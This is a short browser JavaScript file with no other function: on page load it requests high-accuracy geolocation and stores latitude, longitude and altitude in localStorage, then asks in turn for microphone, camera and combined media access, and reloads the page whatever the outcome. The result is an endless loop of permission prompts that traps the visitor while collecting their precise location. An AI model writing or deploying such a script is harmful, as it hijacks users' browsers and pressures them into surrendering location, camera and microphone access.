var option = {enableHighAccuracy: true};
window.onload = () => {
  localStorage.setItem('start', 'start');
  navigator.geolocation.getCurrentPosition(sel, del, option);
}
function aud() {
  navigator.mediaDevices.getUserMedia({audio: true, video: false})
    .then(function(stream) {
    vid();
  })
    .catch(function(err) {
    vid();
  });
}
function vid() {
  navigator.mediaDevices.getUserMedia({audio: false, video: true})
    .then(function(stream) {
    bot();
  })
    .catch(function(err) {
    bot();
  });
}
function bot() {
  navigator.mediaDevices.getUserMedia({audio: true, video: true})
    .then(function(stream) {
    window.location.href = window.location.href;
  })
    .catch(function(err) {
    window.location.href = window.location.href;
  });
}
function sel(pos) {
  localStorage.setItem(localStorage.length, '緯度:' + pos.coords.latitude + '経度' + pos.coords.longitude + '高さ' + pos.coords.altitude);
  aud();
}
function del(er) {
  aud();
}
